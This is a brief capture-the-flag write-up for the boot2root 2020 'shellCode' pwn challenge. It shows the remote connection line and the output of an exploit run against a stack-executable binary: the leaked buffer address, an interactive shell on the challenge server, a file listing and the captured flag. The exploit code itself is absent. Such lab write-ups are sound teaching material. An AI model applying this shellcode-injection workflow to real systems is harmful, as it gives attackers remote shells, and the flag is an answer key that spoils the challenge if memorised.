 shellCode
477

babies love shell legends love shellcode

nc 35.238.225.156 1006

Author: TheBadGuy


```shell
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/shellcode/shellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 35.238.225.156 on port 1006: Done
[*] buff: 0x7fff7cc19470
[*] Switching to interactive mode
$ id
sh: 1: id: not found
$ ls -l
total 44
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 bin
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 dev
-rwxr----- 1 0 1000    23 Dec  6 15:31 flag
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 lib
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 lib32
drwxr-x--- 1 0 1000  4096 Dec  6 14:16 lib64
-rwxr-x--- 1 0 1000 16800 Dec  6 15:31 shellcode
$ cat flag
b00t2root{sehllz_c0de}
```
